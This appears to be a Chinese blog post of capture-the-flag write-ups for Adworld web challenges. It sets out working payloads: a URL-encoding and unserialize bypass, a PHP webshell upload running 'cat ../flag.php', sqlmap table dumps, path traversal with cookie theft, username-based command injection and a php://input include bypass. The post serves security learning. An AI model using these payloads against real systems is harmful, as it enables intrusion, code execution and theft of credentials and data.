<!DOCTYPE html>
<html>
  <head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  
  
  <title>  攻防世界WebWP(Part2) |   SunSh1ne❤️ </title>

 
  
    <link rel="icon" href="/images/favicon.png">
  


  <link rel="stylesheet" href="/nayo.min.css"> 
</head>  
  <body>   
    
      <header class="header-wrapper">

  <nav class="inner">
    <div class="title">
      <a href="/">
        <img class="logo" src="/images/logo.png">
      </a>
    </div>

    <ul class="menu">
      
      
      <li class="item">
        <a class="link" id="menu-home" href="/">
          <i class="iconfont icon-home">
        </i></a>
      </li>
      
      
      
      <li class="item">
        <a class="link" id="menu-archives" href="/archives">
          <i class="iconfont icon-archives">
        </i></a>
      </li>
      
      
      
      <li class="item">
        <a class="link" id="menu-tags" href="/tags">
          <i class="iconfont icon-tags">
        </i></a>
      </li>
      
      
      
      <li class="item">
        <a class="link" id="menu-about" href="/about">
          <i class="iconfont icon-about">
        </i></a>
      </li>
      
      
      
      <li class="item">
        <a class="link" id="menu-search">
          <i class="iconfont icon-search">
        </i></a>
        

        
      
    </li></ul>
  </nav>
</header>

<header class="mobile-header-wrapper">
  <i id="mobile-toggle" class="iconfont icon-menu mobile-toggle"></i>
</header>   

      <div class="container">       
          
          
            <div class="container-inner">  
          

          <article class="post slideDownMin">
  
	
<div class="header">
		<p class="title">	
			攻防世界WebWP(Part2)
		</p>
		<div class="info">	
			<time>
				10月 18, 2019
			</time>

			
			
				<i class="iconfont icon-words"></i>
				<span class="words">6150
				</span>
			
		</div>
</div> 
	

    <script type="text/x-mathjax-config">
        var post = document.getElementsByClassName("post")[0];  
        MathJax.Hub.Config({
            showProcessingMessages: false,
            messageStyle: "none",    
            tex2jax: {
                inlineMath:  [ ["$", "$"] , ["\\(","\\)"]],
                displayMath: [ ["$$","$$"] , ["\\[","\\]"]],
                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code','a'],
            },
            "HTML-CSS": {            
                showMathMenu: false
            }
        });
        MathJax.Hub.Queue(["Typeset",MathJax.Hub,post]);
    </script>
    <style>.MathJax{outline:0;}</style>

    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.2/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
 

	  <div class="typo post-content ">

		

			
					<p>攻防世界web进阶区WP(part2)</p>
<a id="more"></a>
<h3 id="0x00-Web2"><a href="#0x00-Web2" class="headerlink" title="0x00  Web2"></a>0x00  Web2</h3><p>打开页面是一段php加密代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$miwen=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $_o=strrev($str);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        $__=ord($_c)+<span class="number">1</span>;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>编写解密脚本解密即可：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$miwen=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>; </span><br><span class="line">$ming=base64_decode(strrev(str_rot13($miwen)));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ddd</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $b=<span class="string">""</span>;</span><br><span class="line">  <span class="keyword">for</span>($tt=<span class="number">0</span>;$tt&lt;strlen($str);$tt++)</span><br><span class="line">  &#123;</span><br><span class="line">    $b=$b.(chr(ord($str[$tt])<span class="number">-1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> strrev(ddd($ming));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到flag：</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">flag:</span>&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;</span><br></pre></td></tr></table></figure>



<h3 id="0x01-PHP2"><a href="#0x01-PHP2" class="headerlink" title="0x01 PHP2"></a>0x01 PHP2</h3><p>页面只有一句话：“ Can you anthenticate to this website? “，尝试index.php，robots.txt均没有什么收获，尝试index.phps，发现源码泄露</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">"admin"</span>===$_GET[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"admin"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>即我们输入的id不能为”admin“，且urldecode后的id需要为”admin“</p>
<p>经查询，”%61”经urldecode后为”a“，”%61“经urlencode后为”%2561“，payload：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=%2561dmin</span><br></pre></td></tr></table></figure>

<p>传入，经urldecode后即为”admin“</p>
<p><img src="https://i.postimg.cc/FHqJLgb4/1.png" alt></p>
<h3 id="0x02-unserialize3"><a href="#0x02-unserialize3" class="headerlink" title="0x02 unserialize3"></a>0x02 unserialize3</h3><p>页面为一段php代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>

<p>根据题目unserialize可以推测code应该传入<strong>class类</strong>序列化后的结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"xctf"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>但是正常传入会调用<strong>_wakeup()</strong>方法，输出<strong>“bad requests”</strong>，我们需要绕过<strong>_wakeup()</strong>，查询可知，当序列化字符串表示对象个数的值大于真实个数时就会跳过_wakeup()的执行</p>
<p>将payload改为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"xctf"</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>即可绕过_wakeup()</p>
<p><img src="https://i.postimg.cc/zBwL6ssz/2.png" alt></p>
<h3 id="0x03-upload1"><a href="#0x03-upload1" class="headerlink" title="0x03 upload1"></a>0x03 upload1</h3><p>一个文件上传页面，查看源代码发现前端有文件后缀的验证，只允许上传后缀为‘jpg’和‘png’的文件，使用bp抓包修改后缀绕过即可</p>
<p>上传一个带有php代码的文件，后缀添加’.png‘，php代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"ls"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用bp抓包修改后缀，放包</p>
<p><img src="https://i.postimg.cc/1X5zTf0B/3.png" alt></p>
<p>可以看到上传成功，并且显示了文件所在的目录和文件名</p>
<p><img src="https://i.postimg.cc/sxVBrnzp/4.png" alt></p>
<p>访问该文件，成功执行了php代码</p>
<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/v8zgzd7X/5.png" class="lazyload"></p>
<p>继续上传，在bp抓包时修改php代码，查看其他文件，php代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"ls .."</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问上传成功后的文件，发现“flag.php”文件，继续修改php代码上传查看该文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"cat ../flag.php"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问上传后的文件，查看源码即可获得flag</p>
<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/NFpKf1GZ/6.png" class="lazyload"></p>
<h3 id="0x04-ics-04"><a href="#0x04-ics-04" class="headerlink" title="0x04 ics-04"></a>0x04 ics-04</h3><p>题目提示：工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag。</p>
<p>随便注册一个用户登陆，提示<strong>普通用户登录成功,没什么用</strong></p>
<p>但发现可以用同一个用户名注册不同的密码且都可以登陆，考虑找出管理员的用户名注册新密码登陆</p>
<p>在登陆和找回密码页面尝试注入，发现在找回密码页面，输入“sunsh1ne”回显密保问题为”123”即设置的问题，输入“sunsh1ne’ or 1=’1”回显密保问题为“cetc”，猜测存在sql注入</p>
<p>使用bp抓包保存为test.txt再使用sqlmap跑一下</p>
<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/g2wxmXCB/7.png" class="lazyload"></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sqlmap -r test.txt <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>

<p>跑出了4个数据库</p>
<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/YqDv5fsW/8.png" class="lazyload"></p>
<p>继续查询cetc004数据库中的表</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sqlmap -r test.txt -D cetc004 <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>

<p>只有1个user表</p>
<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/CLxZr6m0/9.png" class="lazyload"></p>
<p>查询user表中的数据</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sqlmap -r test.txt -D cetc004 -T<span class="built_in"> user </span>--dump</span><br></pre></td></tr></table></figure>

<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/LXVXNzPh/10.png" class="lazyload"></p>
<p>密码为hash值，使用<strong>“username=c3tlwDmIn23”</strong>的用户名再注册一次，登陆即可获得flag</p>
<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/SxwJsQqQ/11.png" class="lazyload"></p>
<h3 id="0x05-wtf-sh-150"><a href="#0x05-wtf-sh-150" class="headerlink" title="0x05 wtf.sh-150"></a>0x05 wtf.sh-150</h3><p>页面为一个论坛，注册一个用户登陆，可以发贴和回复，随便进入一个帖子，目录为</p>
<p>“/post.wtf?post=K8laH”，测试发现“post”参数存在目录穿越漏洞</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/post.wtf</span>?post=<span class="string">../</span></span><br></pre></td></tr></table></figure>

<p>源码泄露，搜索“flag”，得到有关代码</p>
<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/HxmnwSVf/12.png" class="lazyload"></p>
<p>代码格式化：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"/css/std.css"</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">        $ if contains 'user' $&#123;!URL_PARAMS[@]&#125; &amp;&amp; file_exists "users/$&#123;URL_PARAMS['user']&#125;"</span><br><span class="line">        $ then</span><br><span class="line">        $   local username=$(head -n 1 users/$&#123;URL_PARAMS['user']&#125;);</span><br><span class="line">        $   echo "<span class="tag">&lt;<span class="name">h3</span>&gt;</span>$&#123;username&#125;'s posts:<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>";</span><br><span class="line">        $   echo "<span class="tag">&lt;<span class="name">ol</span>&gt;</span>";</span><br><span class="line">        $   get_users_posts "$&#123;username&#125;" | while read -r post; do</span><br><span class="line">        $       post_slug=$(awk -F/ '&#123;print $2 "#" $3&#125;' &lt;&lt;&lt; "$&#123;post&#125;");</span><br><span class="line">        $       echo "<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">\</span>"/<span class="attr">post.wtf</span>?<span class="attr">post</span>=<span class="string">$&#123;post_slug&#125;\</span>"&gt;</span>$(nth_line 2 "$&#123;post&#125;" | htmlentities)<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>";</span><br><span class="line">        $   done </span><br><span class="line">        $   echo "<span class="tag">&lt;/<span class="name">ol</span>&gt;</span>";</span><br><span class="line">        $   if is_logged_in &amp;&amp; [[ "$&#123;COOKIES['USERNAME']&#125;" = 'admin' ]] &amp;&amp; [[ $&#123;username&#125; = 'admin' ]]</span><br><span class="line">        $   then</span><br><span class="line">        $       get_flag1</span><br><span class="line">        $   fi</span><br><span class="line">        $ fi</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">if is_logged_in &amp;&amp; [[ "$&#123;COOKIES['USERNAME']&#125;" = 'admin' ]] &amp;&amp; [[ $&#123;username&#125; = 'admin' ]]</span><br><span class="line">       $   then</span><br><span class="line">       $       get_flag1</span><br></pre></td></tr></table></figure>

<p>即我们需要以admin用户登录即可获得flag1，源码中发现<strong>“users”</strong>目录，访问下</p>
<p>获得了所有用户的用户名和cookie值</p>
<p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/43VnhCN6/13.png" class="lazyload"></p>
<p>admin的cookie即为</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++<span class="attribute">fldP0scW7g3w</span>==</span><br></pre></td></tr></table></figure>

<p>注意到，点击不同的用户查看帖子时，user参数的值会改变，admin的user参数：</p>
<figure class="highlight pf"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">profile</span>.wtf?<span class="keyword">user</span>=jlvfK</span><br></pre></td></tr></table></figure>

<p>在admin的帖子页面抓包使用admin用户登陆即可找到第一段flag</p>
<p><img src="/images/placeholder.png" alt data-src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C14.PNG" class="lazyload"></p>
<p>第二段flag的获取有些难度，参考了wp</p>
<p>因wtf 不是常规的网页文件，故寻找解析 wtf 文件的代码</p>
<p><img src="/images/placeholder.png" alt data-src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C15.PNG" class="lazyload"></p>
<p>格式化代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">max_page_include_depth=<span class="number">64</span></span><br><span class="line">page_include_depth=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">include_page</span> </span>&#123;</span><br><span class="line">    <span class="comment"># include_page &lt;pathname&gt;</span></span><br><span class="line">    local pathname=$<span class="number">1</span></span><br><span class="line">    local cmd=<span class="string">""</span></span><br><span class="line">    [[ <span class="string">"$&#123;pathname:(-4)&#125;"</span> = <span class="string">'.wtf'</span> ]];</span><br><span class="line">    local can_execute=$?;</span><br><span class="line">    page_include_depth=$(($page_include_depth+<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> [[ $page_include_depth -lt $max_page_include_depth ]]</span><br><span class="line">    then</span><br><span class="line">        local line;</span><br><span class="line">        <span class="keyword">while</span> read -r line; <span class="keyword">do</span></span><br><span class="line">            <span class="comment"># check if we're in a script line or not ($ at the beginning implies script line)</span></span><br><span class="line">            <span class="comment"># also, our extension needs to be .wtf</span></span><br><span class="line">            [[ <span class="string">"$"</span> = <span class="string">"$&#123;line:0:1&#125;"</span> &amp;&amp; $&#123;can_execute&#125; = <span class="number">0</span> ]];</span><br><span class="line">            is_script=$?;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># execute the line.</span></span><br><span class="line">            <span class="keyword">if</span> [[ $is_script = <span class="number">0</span> ]]</span><br><span class="line">            then</span><br><span class="line">                cmd+=$<span class="string">'\n'</span><span class="string">"$&#123;line#"</span>$<span class="string">"&#125;"</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span> [[ -n $cmd ]]</span><br><span class="line">                then</span><br><span class="line">                    <span class="keyword">eval</span> <span class="string">"$cmd"</span> || log <span class="string">"Error during execution of $&#123;cmd&#125;"</span>;</span><br><span class="line">                    cmd=<span class="string">""</span></span><br><span class="line">                fi</span><br><span class="line">                <span class="keyword">echo</span> $line</span><br><span class="line">            fi</span><br><span class="line">        done &lt; $&#123;pathname&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Max include depth exceeded!&lt;p&gt;"</span></span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>网站能够解析并执行wtf文件，我们可以上传可执行的wtf文件从而getshell</p>
<p>继续审计代码，发现reply函数</p>
<p><img src="/images/placeholder.png" alt data-src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C16.PNG" class="lazyload"></p>
<p>格式化代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function reply &#123;</span><br><span class="line">    local post_id=$1;</span><br><span class="line">    local username=$2;</span><br><span class="line">    local text=$3;</span><br><span class="line">    local hashed=$(hash_username &quot;$&#123;username&#125;&quot;);</span><br><span class="line"></span><br><span class="line">    curr_id=$(for d in posts/$&#123;post_id&#125;/*; do basename $d; done | sort -n | tail -n 1);</span><br><span class="line">    next_reply_id=$(awk &apos;&#123;print $1+1&#125;&apos; &lt;&lt;&lt; &quot;$&#123;curr_id&#125;&quot;);</span><br><span class="line">    next_file=(posts/$&#123;post_id&#125;/$&#123;next_reply_id&#125;);</span><br><span class="line">    echo &quot;$&#123;username&#125;&quot; &gt; &quot;$&#123;next_file&#125;&quot;;</span><br><span class="line">    echo &quot;RE: $(nth_line 2 &lt; &quot;posts/$&#123;post_id&#125;/1&quot;)&quot; &gt;&gt; &quot;$&#123;next_file&#125;&quot;;</span><br><span class="line">    echo &quot;$&#123;text&#125;&quot; &gt;&gt; &quot;$&#123;next_file&#125;&quot;;</span><br><span class="line"></span><br><span class="line">    # add post this is in reply to to posts cache</span><br><span class="line">    echo &quot;$&#123;post_id&#125;/$&#123;next_reply_id&#125;&quot; &gt;&gt; &quot;users_lookup/$&#123;hashed&#125;/posts&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回复功能的后台代码，注意到 <strong>“echo “${username}” &gt; “${next_file}”;”</strong> ，这段代码把用户的用户名写入了回复的内容里，并且回复是存放在<strong>“users_lookup”</strong>目录中</p>
<p>注册一个用户名为 <strong>“${find,/,-iname,get_flag2}”</strong> 的用户，写入后门</p>
<p><img src="/images/placeholder.png" alt data-src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C17.PNG" class="lazyload"></p>
<p><strong>%09</strong>为水平制表符，必须添加，不然后台会把我们的后门当做目录去解析</p>
<p>写入成功后访问后门</p>
<p><img src="/images/placeholder.png" alt data-src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C18.PNG" class="lazyload"></p>
<p>可以看到flag2的目录，继续注册一个新用户 <strong>“$/usr/bin/get_flag2”</strong> ，写入后门然后访问即可获得第二段flag</p>
<p><img src="/images/placeholder.png" alt data-src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C19.PNG" class="lazyload"></p>
<h3 id="0x06-baby-web"><a href="#0x06-baby-web" class="headerlink" title="0x06 baby_web"></a>0x06 baby_web</h3><p>题目提示：想想初始页面是哪个</p>
<p>打开页面，url为 <strong>“/1.php”</strong> ，抓包修改为 <strong>“/index.php”</strong> ，头部信息中藏有flag</p>
<p><img src="/images/placeholder.png" alt data-src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C20.png" class="lazyload"></p>
<h3 id="0x07-Web-php-include"><a href="#0x07-Web-php-include" class="headerlink" title="0x07 Web_php_include"></a>0x07 Web_php_include</h3><p>打开页面为一段php代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'hello'</span>];</span><br><span class="line">$page=$_GET[<span class="string">'page'</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr($page, <span class="string">"php://"</span>)) &#123;</span><br><span class="line">    $page=str_replace(<span class="string">"php://"</span>, <span class="string">""</span>, $page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用GET方法传入“$page”参数，strstr()函数判断“$page”中是否存在“php://”，若存在替换为空</p>
<p>strstr()函数对大小写敏感，可以使用大写绕过，尝试使用“php://input”上传一段php代码</p>
<p><img src="/images/placeholder.png" alt data-src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C21.PNG" class="lazyload"></p>
<p>可以看到成功执行，发现flag文件，构造php代码读取flag文件即可</p>
<p><img src="/images/placeholder.png" alt data-src="C:%5CUsers%5C%E8%B4%BE%E5%AF%85%E9%B9%8F%5CDesktop%5C%E7%BD%91%E5%AE%89demo%5Cwp%5Cadworld2%5C22.PNG" class="lazyload"></p>
<h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3>  	
					
	  </div>     
	  

	<div class="bottom">
  <div class="other">
    <div class="meta">
      

      
      <i class="iconfont icon-tag"></i>
      <a class="tag-link" href="/tags/ctf-Writeup/" rel="tag">-ctf -Writeup</a>
      
    </div>

    <div class="operate">
      
      <span class="text">Share</span>
      <ul class="share">
	   			             
        <li class="iconfont 
		icon-share-qq 
		-mob-share-qq 
		item"></li>		
   	   			             
        <li class="iconfont 
		icon-share-weixin 
		-mob-share-weixin 
		item"></li>		
   	   			             
        <li class="iconfont 
		icon-share-weibo 
		-mob-share-weibo 
		item"></li>		
   	   			             
        <li class="iconfont 
		icon-share-facebook 
		-mob-share-facebook 
		item"></li>		
   	   			             
        <li class="iconfont 
		icon-share-twitter 
		-mob-share-twitter 
		item"></li>		
   	   
</ul>	

<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
      
    </div>
  </div>


  
  <nav class="nav">
    <div class="link">
      
      <a href="/2019/10/02/adworldWebWP(1)/" class="link-wrap">
        <strong class="caption">older</strong>
        
        <span class="title">
          攻防世界WebWP(Part1)
        </span>
      </a>
      
    </div>
    <div class="link">
      
      <a href="/2019/11/04/buuctfWebWP/" class="link-wrap">
        <strong class="caption">newer</strong>
        
        <span class="title">
          BUUCTFWebWP
        </span>
      </a>
      
    </div>
  </nav>
  
</div> 
	
<div class="comment">

    

    <div id="comment">
    </div>

    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>

    <script src="//unpkg.com/valine@v1.1.8-beta/dist/Valine.min.js"></script>

    <script>
        new Valine({
            el: '#comment',
            notify: false,
            verify: false,
            app_id: 'cFM0eCo0CQ9xmBXmHi1eltol-gzGzoHsz',
            app_key: 'oh9tizsnvV2vNvWgqEvoNtQO',
            path: window.location.pathname,
            avatar: 'mm',
            guest_info: ['nick', 'mail']
        });
    </script>
    
</div>	
</article>

          </div> 
      </div>            
    
        <i id="toTop" class="iconfont icon-backtotop"></i>

  
    <div class="none" id="search">
    <div class="header">
        <input type="text" placeholder="输入你想搜索的" id="search-input" class="input">
        
        <i id="search-cancel" class="iconfont icon-cancel"></i>
    </div>

    <div id="search-result" class="result"></div>
</div>
     <div class="mobile-menu">      

      
      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/favicon.png">  
      

         
            

            <a class="mobile-menu-link" href="/">首页
            </a>
            
         
            

            <a class="mobile-menu-link" href="/archives">归档
            </a>
            
         
            

            <a class="mobile-menu-link" href="/tags">标签
            </a>
            
         
            

            <a class="mobile-menu-link" href="/about">关于
            </a>
            
         
                          

            <a class="mobile-menu-link mobile-menu-search" href="#">搜索 </a>                 
            
         
      
</div>
        
    



     
    


<footer class="footer">
	<div class="inner">
		<div class="copyright">
			&copy;
			
			2019
			SunSh1ne

			<br>
			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
		</div>
	</div>
</footer>   

    <script src="/nayo.bundle.js"></script>           
  </body>        
</html>